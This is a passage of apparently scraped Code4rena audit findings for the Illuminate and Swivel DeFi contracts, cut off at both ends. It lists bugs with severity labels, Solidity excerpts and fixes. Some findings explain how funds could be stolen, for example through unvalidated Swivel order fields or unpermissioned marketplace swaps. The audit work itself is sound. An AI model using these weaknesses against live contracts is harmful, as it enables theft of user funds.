https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L465:#L466   # Vulnerability details  The Tempus `lend` method calculates the amount of tokens to mint as `amountReturnedFromTempus - lenderBalanceOfMetaPrincipalToken`. This seems wrong as there's no connection between the two items. Tempus has no relation to the iPT token.  ## Impact Wrong amount of iPT will be minted to the user. If the Lender contract has iPT balance, the function will revert, otherwise, user will get minted 0 iPT tokes.  ## Proof of Concept [This](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L465:#L469) is how the `lend` method calculates the amount of iPT tokens to mint: ```         uint256 returned = ITempus(tempusAddr).depositAndFix(Any(x), Any(t), a - fee, true, r, d) -             illuminateToken.balanceOf(address(this));         illuminateToken.mint(msg.sender, returned); ``` The Tempus `depositAndFix` method [does not return](https://etherscan.io/address/0xdB5fD0678eED82246b599da6BC36B56157E4beD8#code#F1#L127) anything. Therefore this calculation will revert if `illuminateToken.balanceOf(address(this)) > 0`, or will return 0 if the balance is 0.  [Note: there's another issue here where the depositAndFix sends wrong parameters - I will submit it in another issue.]  ## Recommended Mitigation Steps I believe that what you intended to do is to check how many Tempus principal tokens the contract received. So you need to check Lender's `x.tempusPool().principalShare()` before and after the swap, and the delta is the amount received.  "}, {"title": "```withdraw``` eToken before ```withdrawFee``` of eToken could render ```withdrawFee``` of eToken unfunctioning", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/209", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L705-L720 https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L659-L675   # Vulnerability details  ```withdrawFee``` of eToken requires the amount of eToken in ```Lender.sol``` >= ```fees[eToken]``` so ```Safe.transfer``` will not revert. However if the admin ```withdraw(eToken)``` first, the balance of eToken in ```Lender.sol``` will equal to zero while ```fees[eToken]``` remains the same and ```withdrawFee(eToken)``` will become unfunctioning since eToken in the contract does not match ```fees[eToken]```. The admin will need to rely on ```withdraw```, which takes 3 days before transfering, to get the future fees of eToken.  ### Mitigations add ```fees[eToken] = 0;``` after ```withdrawals[e] = 0;```  in ```withdraw```.   "}, {"title": "Lend method signature for illuminate does not track the accumulated fee ", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/208", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L185-L235   # Vulnerability details  Normally the amount of fees after ```calculateFee``` should be added into ```fees[u]``` so that the admin could withdraw it through ```withdrawFee```. However, illuminate ledning does not track ```fees[u]```. Therefore, the only way to get fees back is through ```withdraw``` which admin needs to wait at least 3 days before receiving the fees.    ### Mitigations  Add the amount of fee after each transaction into ```fees[u]``` like other lending method.   for example: ``` fees[u] += calculateFee(a);```  "}, {"title": "Swivel lend method doesn't pull protocol fee from user", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/201", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L297   # Vulnerability details  The Swivel `lend` method adds to `fees[u]` the order fee, but does not pull that fee from the user. It only pulls the order-post-fee amount.  ## Impact `withdrawFee` will fail, as it tries to transfer more tokens than are in the contract.  ## Proof of Concept The Swivel `lend` method [sums up](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L279:#L283) the fees to `totalFee`, and the amount to send to Swivel in `lent`: ```                     totalFee += fee;                     // Amount lent for this order                     uint256 amountLent = amount - fee;                     // Sum the total amount lent to Swivel (amount of ERC5095 tokens to mint) minus fees                     lent += amountLent; ``` It then [increments](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L294:#L297) `fees[u]` by `totalFee`, but only pulls from the user `lent`: ```             fees[u] += totalFee;             // transfer underlying tokens from user to illuminate             Safe.transferFrom(IERC20(u), msg.sender, address(this), lent); ``` Therefore, `totalFee` has not been pulled from the user. The `fees` variable now includes tokens which are not in the contract, and `withdrawFee` will fail as [it tries to transfer](https://github.com/code-423n4/2022-06-illuminate/blob/main/lender/Lender.sol#L667) `fees[u]`.  ## Recommended Mitigation Steps Pull `lent + totalFee` from the user.  "}, {"title": "Redeemer.redeem() for Element withdraws PT to wrong address.", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/182", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/redeemer/Redeemer.sol#L187   # Vulnerability details  ## Impact Redeemer.redeem() for Element withdraws PT to wrong address. This might cause a result of loss of PT.   ## Proof of Concept According to the ReadMe.md, Redeemer should transfer external principal tokens from Lender.sol to Redeemer.sol. But it transfers to the \"marketPlace\" and it would lose the PT.   ## Tools Used Manual Review   ## Recommended Mitigation Steps Modify [IElementToken(principal).withdrawPrincipal(amount, marketPlace);](https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/redeemer/Redeemer.sol#L187) like this.  ``` IElementToken(principal).withdrawPrincipal(amount, address(this)); ```  "}, {"title": "Checking yieldBearingToken against u instead of backingToken", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/139", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L446   # Vulnerability details  ## Impact The lend function for tempus will fail with the right market.  ## Proof of concept checks `if (ITempus(principal).yieldBearingToken() != IERC20Metadata(u))`, while it should check `ITempus(principal).backingToken()`   ## Recommendation Do this instead: ```     if (ITempus(principal).backingToken() != IERC20Metadata(u)) ```  "}, {"title": "`Safe.sol` allow success transaction to fail", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/100", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Safe.sol#L82-L105 https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/marketplace/Safe.sol#L82-L105 https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/redeemer/Safe.sol#L82-L105   # Vulnerability details   ## `Safe.sol` allow success transaction to fail Some ERC20 token implementations return more than 32 bytes(common Curve token). This can be a real concern since all core component using the same Safe Transfer Lib   After some test using  [https://github.com/Rari-Capital/solmate.git]  ``` [BAIL] testTransferFromWithReturnsTooMuch() [FAIL] testTransferFromWithReturnsTooMuch(address,address,uint256,bytes). Counterexample: (0x00000000000000000000000000000000000ffffE, 0x0000000000000000000000000000000000000001, 115792089237316195423570985008687907853269984665640564039457584007913129639935, 0x) [BAIL] testApproveWithReturnsTooMuch() [FAIL] testFailApproveWithReturnsTwo(address,uint256,bytes). Counterexample: (0x000000000000000000000000000000000004C0E4, 0, 0x) [FAIL] testApproveWithReturnsTooMuch(address,uint256,bytes). Counterexample: (0x00000000000000000000000000000000000ffffE, 1, 0x) [FAIL] testTransferWithReturnsTooMuch(address,uint256,bytes). Counterexample: (0x00000000000000000000000000000000000fFFFf, 27379694730619439495811032571422462501613862458272780721729846947764021554765, 0x) [BAIL] testTransferWithReturnsTooMuch() [FAIL] testFailTransferWithGarbage(address,uint256,bytes,bytes). Counterexample: (0x00000000000000000000000000000000000F40ae, 68959440145808540021340254471931488759807906017241826129032747446, 0x15dedf2835614b24353f20baa93783e58366c16defd811eddd5de9d9057489ca, 0xd946b45606da60c706edf8c4eb76e0d281d8f063f14850d952ea10c697f0931756bec369411fa90953093f29086d44a50b2cf829a5815f5a72124ff447ac4a69) ```   ## Impact If a transaction fail or success will not be considered and this will pass any call of Safe lib  ## Proof of Concept  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Safe.sol  Safe lib used here ``` ./lender/Lender.sol ./marketplace/marketplace.sol ./redeemer/redeemer.sol ```      1- no data     if iszero(r) {         // Copy the revert message into memory.         returndatacopy(0, 0, returnDataSize)          // Revert with the same message.         revert(0, returnDataSize)     }      2- returndatasize > 32 bytes     default {         // It returned some malformed input.         result := 0     }      3- reverting     require(success(result), 'transfer from failed');  ### Tools Used dapp-tools, vim  ### Recommended Mitigation Steps Use the latest Safe Transfer lib available   "}, {"title": "Pendle Uses Wrong Return Value For `swapExactTokensForTokens()`", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/94", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L411   # Vulnerability details  ## Impact  The function `swapExactTokensForTokens()` will return and array with the 0 index being the input amount follow by each output amount. The 0 index is incorrectly used in Pendle `lend()` function as the output amount. As a result the value of `returned` will be the invalid (i.e. the input rather than the output).  Since this impacts how many PTs will be minted to the `msg.sender`, the value will very likely be significantly over or under stated depending on the exchange rate. Hence the `msg.sender` will receive an invalid number of PT tokens.  ## Proof of Concept  ```solidity             address[] memory path = new address[](2);             path[0] = u;             path[1] = principal;              returned = IPendle(pendleAddr).swapExactTokensForTokens(a - fee, r, path, address(this), d)[0]; ```   ## Recommended Mitigation Steps  The amount of `principal` returned should be index 1 of the array returned by `swapExactTokensForTokens()`.  "}, {"title": "Calls To `Swivel.initiate()` Do Not Verify `o.exit` or `o.vault` Allowing An Attacker To Manipulate Accounting In Their Favour", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/93", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/912be2a90ded4a557f121fe565d12ec48d0c4684/lender/Lender.sol#L299   # Vulnerability details  ## Impact  Swivel `lend()` does not validate the `o.exit` and `o.vault` for each order before making the external call to Swivel. These values determine which internal functions is [called in Swivel](https://github.com/Swivel-Finance/swivel/blob/2471ea5cda53568df5e5515153c6962f151bf358/contracts/v2/swivel/Swivel.sol#L64-L77).  The intended code path is `initiateZcTokenFillingVaultInitiate()` which takes the underlying tokens and mints zcTokens to the `Lender`. If one of the other functions is called the accounting in `lend()`. Swivel may transfer more tokens from `Lender` to `Swivel` than paid for by the caller of `lend()`.  The impact is that underlying tokens may be stolen from `Lender`.  ## Proof of Concept  Consider the example where [initiateZcTokenFillingZcTokenExit()](https://github.com/Swivel-Finance/swivel/blob/2471ea5cda53568df5e5515153c6962f151bf358/contracts/v2/swivel/Swivel.sol#L162) is called. This will transfer `a - premiumFilled + fee` from `Lender` to `Swivel` rather than the expected `a + fee`.  ## Recommended Mitigation Steps  In `lend()` restrict the values of `o.exit` and `o.vault` so only one case can be triggered in `Swivel.initiate()`.  "}, {"title": "Division Before Multiplication Can Lead To Zero Rounding Of Return Amount", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/48", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L280   # Vulnerability details  ## Impact  There is a division before multiplication bug that exists in [`lend()`](https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L280) for the Swivel case.  If `order.premium` is less than `order.principal` then `returned` will round to zero due to the integer rounding.  When this occurs the user's funds are essentially lost. That is because they transfer in the underlying tokens but the amount sent to `yield(u, y, returned, address(this))` will be zero.  ## Proof of Concept  ```solidity     function lend(         uint8 p,         address u,         uint256 m,         uint256[] calldata a,         address y,         Swivel.Order[] calldata o,         Swivel.Components[] calldata s     ) public unpaused(p) returns (uint256) {          // lent represents the number of underlying tokens lent         uint256 lent;         // returned represents the number of underlying tokens to lend to yield         uint256 returned;          {             uint256 totalFee;             // iterate through each order a calculate the total lent and returned             for (uint256 i = 0; i < o.length; ) {                 Swivel.Order memory order = o[i];                 // Require the Swivel order provided matches the underlying and maturity market provided                 if (order.underlying != u) {                     revert NotEqual('underlying');                 } else if (order.maturity > m) {                     revert NotEqual('maturity');                 }                 // Determine the fee                 uint256 fee = calculateFee(a[i]);                 // Track accumulated fees                 totalFee += fee;                 // Sum the total amount lent to Swivel (amount of ERC5095 tokens to mint) minus fees                 lent += a[i] - fee;                 // Sum the total amount of premium paid from Swivel (amount of underlying to lend to yield)                 returned += (a[i] - fee) * (order.premium / order.principal);                  unchecked {                     i++;                 }             }             // Track accumulated fee             fees[u] += totalFee;              // transfer underlying tokens from user to illuminate             Safe.transferFrom(IERC20(u), msg.sender, address(this), lent);             // fill the orders on swivel protocol             ISwivel(swivelAddr).initiate(o, a, s);              yield(u, y, returned, address(this));         }          emit Lend(p, u, m, lent);         return lent;     } ```  Specifically the function `returned += (a[i] - fee) * (order.premium / order.principal);`  ## Recommended Mitigation Steps  The multiplication should occur before division, that is `((a[i] - fee) * order.premium) / order.principal);`.  "}, {"title": "The lend function for tempus uses the wrong return value of depositAndFix", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/37", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L452-L453   # Vulnerability details  ## Impact The depositAndFix function of the TempusController contract returns two uint256 data, the first is the number of shares exchanged for the underlying token, the second is the number of principalToken exchanged for the shares, the second return value should be used in the lend function for tempus. This will cause the contract to mint an incorrect number of illuminateTokens to the user. ## Proof of Concept https://github.com/code-423n4/2022-06-illuminate/blob/92cbb0724e594ce025d6b6ed050d3548a38c264b/lender/Lender.sol#L452-L453 https://github.com/tempus-finance/tempus-protocol/blob/master/contracts/TempusController.sol#L52-L76 ## Tools Used None ## Recommended Mitigation Steps interfaces.sol ``` interface ITempus {     function maturityTime() external view returns (uint256);      function yieldBearingToken() external view returns (IERC20Metadata);      function depositAndFix(         Any,         Any,         uint256,         bool,         uint256,         uint256     ) external returns (uint256, uint256); } ``` Lender.sol ```         (,uint256 returned) = ITempus(tempusAddr).depositAndFix(Any(x), Any(t), a - fee, true, r, d);         returned -= illuminateToken.balanceOf(address(this)); ```  "}, {"title": "sellPrincipalToken, buyPrincipalToken, sellUnderlying, buyUnderlying uses pool funds but pays msg.sender", "html_url": "https://github.com/code-423n4/2022-06-illuminate-findings/issues/21", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-06-illuminate-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-illuminate/blob/3ca41a9f529980b17fdc67baf8cbee5a8035afab/marketplace/MarketPlace.sol#L136-L189   # Vulnerability details  ## Impact Fund loss from marketplace  ## Proof of Concept sellPrincipalToken, buyPrincipalToken, sellUnderlying, buyUnderlying are all unpermissioned and use marketplace funds to complete the action but send the resulting tokens to msg.sender. This means that any address can call these functions and steal the resulting funds  ## Tools Used  ## Recommended Mitigation Steps All functions should use safetransfer to get funds from msg.sender not from marketplace  "}, {"title": "Swivel.scheduleFeeChange(), Swivel.setFee() wouldn't work as expected for user preference.", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/118", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L473 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L495   # Vulnerability details  ## Impact Swivel.scheduleFeeChange(), Swivel.setFee() wouldn't work as expected for user preference.  Users can't react properly after [ScheduleFeeChange() event](https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L477) because they don't know whether the new fee settings would be better/worse for them.   ## Proof of Concept According to [this explanation](https://github.com/code-423n4/2022-07-swivel#admin-privileges), these functions are to ensure users can feel comfortable.  Btw with Swivel.scheduleFeeChange(), it emits only when to change fee settings without detailed values.  So users don't know whether the new fee settings will be better or worse for them.  Even if the admin is going to set larger feenominators for lower fee percent, users don't know that until actual fees are set using setFee() and such delays are almost meaningless for users.  I think we should announce the detailed fee settings with Swivel.scheduleFeeChange() function so that users can react accordingly after checking new fee settings.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend adding an additional array - pendingFeenominators [here](https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L37).  ``` uint16[4] public pendingFeenominators; ```  And scheduleFeeChange() function should have i, d parameters same as current setFee() function so that pendingFeenominators save new settings. (Also keep original fee settings if some indexs aren't updated.)  After that, we can call setFee() without any params and feenominators will be replaced with pendingFeenominators.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/78", "labels": ["bug", "duplicate", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Summary | Issue | Instances | | ------ | :--------: | | `++i` uses less gas compared to `i++` | 5 | | `uint8` incurs more gas overhead compared to `uint256` | 7 |  | Use named return variable instead of using return | 2 |  | Named return variable is not used | 8 |  | Use != 0 instead of > 0 for a `uint`  | 17 |     # Gas Optimizations  ## `++i` uses less gas compared to `i++`   This is especially relevant for the use of `i++` in `for` loops. This saves 6 gas per loop.   _There are 5 instances of this issue:_  ``` FILE: Swivel/Swivel.sol  100:   unchecked {i++;} ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L100  ``` FILE: Swivel/Swivel.sol  269:    unchecked {i++;} ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L269  ``` FILE: Swivel/Swivel.sol  417      unchecked { 418        i++; 419:      } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L417-L419  ``` FILE: Swivel/Swivel.sol  510      unchecked { 511        x++; 512:      } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L510-L512  ``` FILE: Swivel/Swivel.sol  563      unchecked { 564        i++; 565:      } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L563-L565   ## `uint8`, `uint16`,  incurs more gas overhead compared to `uint256`  _There are 7 instances of this issue:_  ``` File: Swivel/Swivel.sol  35:   uint16 constant public MIN_FEENOMINATOR = 33; ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L35  ``` File: Swivel/Swivel.sol  37:   uint16[4] public feenominators; ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L37  ``` FILE: Marketplace/MarketPlace.sol  65:   uint8 p, ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Marketplace/MarketPlace.sol#L65  ``` FILE: Creator/Creator.sol  31:   uint8 p, ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/Creator.sol#L31  ``` FILE: Creator/Creator.sol  38:   uint8 d ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/Creator.sol#L38  ``` FILE: VaultTracker/VaultTracker.sol  26:   uint8 public immutable protocol; ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L26  ``` FILE: Creator/ZcToken.sol  17:   uint8 public immutable protocol; ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L17   ## Use named return variable instead of using return  _There are 2 instances of this issue:_  ``` FILE: Swivel/Swivel.sol  697:  return hash; ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L697  ``` FILE: Swivel/Swivel.sol  207:    return interest; ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Marketplace/MarketPlace.sol#L207   ## Named return variable is not used  Remove the named return variable to save 25 gas per function call.   _There are 8 instances of this issue:_  ``` FILE: Marketplace/Marketplace.sol  148:     function authRedeem(uint8 p, address u, uint256 m, address f, address t, uint256 a) public authorized(markets[p][u][m].zcToken) returns (uint256 underlyingAmount) { ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Marketplace/MarketPlace.sol#L148  ``` FILE: Creator/ZcToken.sol  43:    function convertToUnderlying(uint256 principalAmount) external override view returns (uint256 underlyingAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L43  ``` FILE: Creator/ZcToken.sol  52:   function convertToPrincipal(uint256 underlyingAmount) external override view returns (uint256 principalAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L52  ``` FILE: Creator/ZcToken.sol  61:   function maxRedeem(address owner) external override view returns (uint256 maxPrincipalAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L61  ``` FILE: Creator/ZcToken.sol  70:    function previewRedeem(uint256 principalAmount) external override view returns (uint256 underlyingAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L70  ``` FILE: Creator/ZcToken.sol  79:   function maxWithdraw(address owner) external override view returns (uint256 maxUnderlyingAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L79  ``` FILE: Creator/ZcToken.sol  88:     function previewWithdraw(uint256 underlyingAmount) external override view returns (uint256 principalAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L88  ``` FILE: Creator/ZcToken.sol  98:     function withdraw(uint256 underlyingAmount, address receiver, address holder) external override returns (uint256 principalAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L98  ``` FILE: Creator/ZcToken.sol  124:     function redeem(uint256 principalAmount, address receiver, address holder) external override returns (uint256 underlyingAmount){ ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/ZcToken.sol#L124   ## Use != 0 instead of > 0 for a `uint`  This saves 6 gas per instance.   _There are 17 instances of this issue:_  ``` FILE: Swivel/Swivel.sol  118:    if (amount > o.premium) { revert Exception(5, amount, o.premium, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L118  ``` FILE: Swivel/Swivel.sol  155:   if (amount > o.principal) { revert Exception(5, amount, o.principal, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L155  ``` FILE: Swivel/Swivel.sol  190:   if (amount > o.principal) { revert Exception(5, amount, o.principal, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L190  ``` FILE: Swivel/Swivel.sol  219:   if (amount > o.premium) { revert Exception(5, amount, o.premium, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L219  ``` FILE: Swivel/Swivel.sol  284:  if (amount > o.premium) { revert Exception(5, amount, o.premium, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L284  ``` FILE: Swivel/Swivel.sol  315:   if (amount > o.principal) { revert Exception(5, amount, o.principal, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L315  ``` FILE: Swivel/Swivel.sol  345:   if (amount > o.principal) { revert Exception(5, amount, o.principal, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L345  ``` FILE: Swivel/Swivel.sol  380:   if (amount > o.premium) { revert Exception(5, amount, o.premium, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/Swivel/Swivel.sol#L380  ``` FILE: VaultTracker/VaultTracker.sol  54:    if (vlt.notional > 0) { ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L54  ``` FILE: VaultTracker/VaultTracker.sol  59:   if (maturityRate > 0) { // Calculate marginal interest ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L59  ``` FILE: VaultTracker/VaultTracker.sol  86:  if (a > vlt.notional) { revert Exception(31, a, vlt.notional, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L86  ``` FILE: VaultTracker/VaultTracker.sol  93:   if (maturityRate > 0) { // Calculate marginal interest ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L93  ``` FILE: VaultTracker/VaultTracker.sol  123:   if (maturityRate > 0) { // Calculate marginal interest ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L123  ``` FILE: VaultTracker/VaultTracker.sol  158:   if (a > from.notional) { revert Exception(31, a, from.notional, address(0), address(0)); } ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L158  ``` FILE: VaultTracker/VaultTracker.sol  165:   if (maturityRate > 0) {  ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L165  ``` FILE: VaultTracker/VaultTracker.sol  181:   if (to.notional > 0) { ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L181  ``` FILE: VaultTracker/VaultTracker.sol  184:   if (maturityRate > 0) {  ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L184  ``` FILE: VaultTracker/VaultTracker.sol  224:  if (maturityRate > 0) {  ``` https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L222  "}, {"title": "unpaused(p) modifier missing in authRedeem function", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/main/Marketplace/MarketPlace.sol#L148   # Vulnerability details  ## Impact Due to missing modifier, User will be able to redeem zcTokens and withdraw underlying even in paused Market. This happens due to missing unpaused(p) modifier  ## Proof of Concept 1. Lets see function definition for authRedeem function  ``` function authRedeem(uint8 p, address u, uint256 m, address f, address t, uint256 a) public authorized(markets[p][u][m].zcToken) returns (uint256 underlyingAmount) ```  2. Observe that unpaused(p) modifier is missing  3. This means if Marketplace is placed under paused state by Admin, then also User can call authRedeem at Marketplace via withdraw/redeem at ZcToken contract.   4. This will allow Users to withdraw in paused state which is incorrect  ## Recommended Mitigation Steps Add unpaused(p) modifier in authRedeem function  ``` function authRedeem(uint8 p, address u, uint256 m, address f, address t, uint256 a) public authorized(markets[p][u][m].zcToken) unpaused(p) returns (uint256 underlyingAmount) { ... } ```  "}, {"title": "Interface definition error", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/39", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Marketplace/Interfaces.sol#L52 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Marketplace/MarketPlace.sol#L164 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L620 https://github.com/Swivel-Finance/gost/blob/a76ac859df049527c3e5df85e706dec6ffa0e2bb/test/swivel/Swivel.sol#L10   # Vulnerability details  ## Impact MarketPlace.authRedeem() call interface ISwivel.authRedeem() but Swivel contract  does not have this method only method  \"authRedeemZcToken()\" The result will cause MarketPlace.authRedeem() to fail forever, thus causing ZcToken.withdraw() to fail forever  ## Proof of Concept   MarketPlace.sol call ISwivel.authRedeem()  ```   function authRedeem(uint8 p, address u, uint256 m, address f, address t, uint256 a) public authorized(markets[p][u][m].zcToken) returns (uint256 underlyingAmount) {      .....        ISwivel(swivel).authRedeem(p, u, market.cTokenAddr, t, a);       .....     } else {       .....       ISwivel(swivel).authRedeem(p, u, market.cTokenAddr, t, amount);      ....     } ```  Swivel.sol does not have   authRedeem() ,only authRedeemZcToken() ```   function authRedeemZcToken(uint8 p, address u, address c, address t, uint256 a) external authorized(marketPlace) returns(bool) {     // redeem underlying from compounding     if (!withdraw(p, u, c, a)) { revert Exception(7, 0, 0, address(0), address(0)); }     // transfer underlying back to msg.sender     Safe.transfer(IErc20(u), t, a);      return (true);   }  ```  ## Tools Used  ## Recommended Mitigation Steps  Swivel contract need declare \"is ISwivel\" and change method name Other contracts should also declare \"is Iinterfacename\" to avoid method name errors like IMarketPlace    "}, {"title": "VaultTracker has the wrong admin", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/36", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", 